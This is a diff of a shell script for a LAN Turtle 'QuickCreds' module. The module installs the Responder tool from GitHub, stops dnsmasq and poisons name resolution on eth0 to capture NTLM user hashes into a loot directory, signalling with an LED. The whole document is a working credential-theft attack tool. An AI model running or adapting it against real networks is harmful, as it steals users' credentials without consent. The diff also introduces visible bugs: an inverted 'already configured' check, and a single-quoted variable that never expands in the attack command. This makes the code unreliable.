@@ -11,46 +11,75 @@ CONF=/tmp/QuickCreds.form
 : ${DIALOG_ITEM_HELP=4}
 : ${DIALOG_ESC=255}
 
-LOOTDIR="/root/loot/quickcreds/"
-RESPLOG=$LOOTDIR"responder.log"
-RESPROOT="/sd"
-RESPTEMPDL="/tmp/ResponderDownload/"
+# use regular location after setup extroot to use SD storage
+RESPROOT="/etc/turtle"
+# working directory for Responder, not the loot directory
+RESPLOGDIR="/tmp/Responder"
+# loot directory for QuickCreds
+LOOTDIR="/root/loot/quickcreds"
+# Responder log file
+RESPLOG="$LOOTDIR/responder.log"
+# Responder download location
+RESPTEMPDL="/tmp/Download"
+# Responder download URL
 RESPURL="https://github.com/lgandx/Responder/archive/refs/tags/v3.0.6.0.zip"
-RESPLOGDIR=$RESPROOT/"Responder/logs"
 SLEEPTIMER="1"
 
 function configure {
-    # If SD card is mounted continue if not fail due to not enough space.
-    if grep -qs $RESPROOT /proc/mounts; then
-        /bin/echo "SD card is mounted."
-    else
-        /usr/bin/dialog --title "QuickCreds" --msgbox "An SD card is required to install this module." 9 72
-        exit 1
-    fi
-
     # Ask if the user really wants to install the module and its dependencies
     /usr/bin/dialog --title "QuickCreds" --yesno "\nInstall dependencies and configure QuickCreds?\nAn Internet connection is required for installation.\n" 8 60
     response=$?
     case $response in
-        0) ;;
-        1) exit ;;
-        255) exit ;;
+    0) ;;
+    1) exit ;;
+    255) exit ;;
     esac
 
+    # Setup loot directory and complete setup
+    /bin/mkdir -p "$LOOTDIR"
+
     # Check to see if QuickCreds has already been configured
-    if [[ -d "$LOOTDIR" || -s "$RESPLOG" ]]; then
+    # Check if Responder is installed (not the module available in the Turtle "GUI", but the tool taken straight from GitHub)
+    if [[ ! -d "$RESPROOT"/Responder || ! -s "$RESPROOT"/Responder/Responder.py ]]; then
         /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe QuickCreds module is already configured.\nCreds are saved to $LOOTDIR.\nEnable this module to attack on boot." 9 72
         exit 1
     fi
 
+    check_internet
+
+    install_dependencies
+
+    install_responder
+
+    /usr/bin/dialog --title "QuickCreds" --msgbox "\nConfiguration complete. Creds will be saved to $LOOTDIR\nEnable this module to have it start the attack on boot.\n" 9 72
+}
+
+function check_internet {
     # Check for Internet connection
-    /bin/ping -q -w 5 -c 1 www.google.com &> /dev/null && {
+    /bin/ping -q -w 5 -c 1 www.google.com &>/dev/null && {
         :
     } || {
         /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Internet and try again." 9 72
         exit 1
     }
+}
 
+function install_responder {
+    # Clean up
+    /bin/rm -rf "$RESPROOT"/Responder/
+    /bin/rm -rf "$RESPTEMPDL"/master.zip*
+    # Create new
+    /bin/mkdir -p "$RESPTEMPDL"
+    # Download and extract
+    /usr/bin/wget --progress=dot "$RESPURL" -O "$RESPTEMPDL"/master.zip 2>&1 | /usr/bin/dialog --progressbox "Download dependency responder" 14 72
+    # Unpack the GitHub download
+    /usr/bin/unzip "$RESPTEMPDL"/master.zip -d "$RESPTEMPDL" 2>&1 | /usr/bin/dialog --progressbox "Unpacking dependency responder" 14 72
+    /bin/mv "$RESPTEMPDL"/Responder-3.0.6.0 "$RESPTEMPDL"/Responder
+    /bin/mv "$RESPTEMPDL"/Responder "$RESPROOT"
+    /bin/rm -rf "$RESPTEMPDL"/master.zip*
+}
+
+function install_dependencies {
     # Install dependencies
     /bin/opkg update | /usr/bin/dialog --progressbox "Updating opkg" 14 72
 
@@ -73,31 +102,10 @@ function configure {
     if [[ ! $(/bin/opkg list-installed | /bin/grep unzip) ]]; then
         /bin/opkg install unzip | /usr/bin/dialog --progressbox "Installing dependency unzip" 14 72
     fi
-
-    # Check if Responder is installed (not the module available in the Turtle "GUI", but the tool taken straight from GitHub)
-    if [[ ! -d "$RESPROOT" || ! -s "$RESPROOT"Responder.py ]]; then
-        # Clean up
-        /bin/rm -rf "$RESPROOT"Responder/
-        /bin/rm -rf "$RESPTEMPDL"master.zip*
-        # Create new
-        /bin/mkdir -p "$RESPTEMPDL"
-        # Download and extract
-        /usr/bin/wget --progress=dot "$RESPURL" -O "$RESPTEMPDL"master.zip 2>&1 | /usr/bin/dialog --progressbox "Download dependency responder" 14 72
-        # Unpack the GitHub download
-        /usr/bin/unzip "$RESPTEMPDL"master.zip -d "$RESPTEMPDL" 2>&1 | /usr/bin/dialog --progressbox "Unpacking dependency responder" 14 72
-        /bin/mv "$RESPTEMPDL"Responder-3.0.6.0 "$RESPTEMPDL"Responder
-        /bin/mv "$RESPTEMPDL"Responder "$RESPROOT"
-        /bin/rm -rf "$RESPTEMPDL"master.zip*
-    fi
-
-    # Setup loot directory and complete setup
-    /bin/mkdir -p "$LOOTDIR"
-
-    /usr/bin/dialog --title "QuickCreds" --msgbox "\nConfiguration complete. Creds will be saved to $LOOTDIR\nEnable this module to have it start the attack on boot.\n" 9 72
 }
 
 function finished {
-    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+    /bin/echo 255 >/sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
     /bin/sync
     exit
 }
@@ -119,48 +127,48 @@ function start {
     cd $LOOTDIR
     dircount=$(/bin/ls -lad $LOOTDIR* | /usr/bin/wc -l)
     # Adjust the number when creating the numbered lootdir for this session, if no existing dirs (i.e. wc -l = 0) then start with 1 instead of 0 otherwise there will be a gap between 0 and 2
-    if [[ $((dircount)) == 0 ]]; then dircount=1 ; fi
-    /bin/mkdir $LOOTDIR"Creds"$((dircount))
+    if [[ $((dircount)) == 0 ]]; then dircount=1; fi
+    /bin/mkdir $LOOTDIR"/Creds"$((dircount))
     # Delete all current Responder logs
     /bin/rm -rf $RESPLOGDIR
-    /bin/ln -s $LOOTDIR"Creds"$((dircount)) $RESPLOGDIR
+    /bin/ln -s $LOOTDIR"/Creds"$((dircount)) $RESPLOGDIR
 
     # Saving interface info, surplus information and can be deleted
-    /sbin/ifconfig > $LOOTDIR"Creds"$((dircount))/ifconfig_dump.log
+    /sbin/ifconfig >$LOOTDIR"/Creds"$((dircount))/ifconfig_dump.log
 
-    /bin/echo "Creds$((dircount)) - Initiating Responder attack..." >> $RESPLOG
+    /bin/echo "Creds$((dircount)) - Initiating Responder attack..." >>$RESPLOG
 
     # Stop dnsmasq
-    /bin/echo "Creds$((dircount)) - Stopping dnsmasq" >> $RESPLOG
-    /etc/init.d/dnsmasq stop 1&> /dev/null
+    /bin/echo "Creds$((dircount)) - Stopping dnsmasq" >>$RESPLOG
+    /etc/init.d/dnsmasq stop 1 &>/dev/null
 
     # Execute attack
-    /bin/echo "Creds$((dircount)) - Starting screen and Responder" >> $RESPLOG
-    /usr/sbin/screen -dmS responder /bin/bash -c 'cd /sd/Responder; /usr/bin/python /sd/Responder/Responder.py -I eth0 -w -r -d -P'
+    /bin/echo "Creds$((dircount)) - Starting screen and Responder" >>$RESPLOG
+    /usr/sbin/screen -dmS responder /bin/bash -c 'cd "$RESPROOT"/Responder; /usr/bin/python "$RESPROOT"/Responder/Responder.py -I eth0 -w -r -d -P'
 
-    /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >> $RESPLOG
+    /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >>$RESPLOG
     # Blink upon hash capture
     while true; do
         # Grep for user creds and do not match on machine creds, machine usernames end in $
         if [[ $(/bin/grep -v '\$:' $RESPLOGDIR/*NTLM* 2>/dev/null) ]]; then
-            /bin/echo "Creds$((dircount)) - Found user creds NTLM file in the logs directory!" >> $RESPLOG
-            /bin/echo "Creds$((dircount)) - Creds obtained and saved" >> $RESPLOG
+            /bin/echo "Creds$((dircount)) - Found user creds NTLM file in the logs directory!" >>$RESPLOG
+            /bin/echo "Creds$((dircount)) - Creds obtained and saved" >>$RESPLOG
             #Copy all responder logs to loot directory
-            /bin/echo "Creds$((dircount)) - Copying the Responder native logs to loot directory" >> $RESPLOG
-            /bin/cp $RESPLOGDIR/* $LOOTDIR"Creds"$((dircount))
-            /bin/echo "Creds$((dircount)) - Calling the finished function" >> $RESPLOG
+            /bin/echo "Creds$((dircount)) - Copying the Responder native logs to loot directory" >>$RESPLOG
+            /bin/cp $RESPLOGDIR/* $LOOTDIR"/Creds"$((dircount))
+            /bin/echo "Creds$((dircount)) - Calling the finished function" >>$RESPLOG
             finished
         fi
-        /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+        /bin/echo 255 >/sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
         /bin/sleep $SLEEPTIMER
-        /bin/echo 0 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
+        /bin/echo 0 >/sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
         /bin/sleep $SLEEPTIMER
     done
 }
 
 function stop {
     /bin/kill $(/bin/ps | /bin/grep [R]esponder | /usr/bin/awk {'print $1'})
-    /etc/init.d/dnsmasq start 1&> /dev/null
+    /etc/init.d/dnsmasq start 1 &>/dev/null
     /bin/echo "QuickCreds Stopped"
 }
 
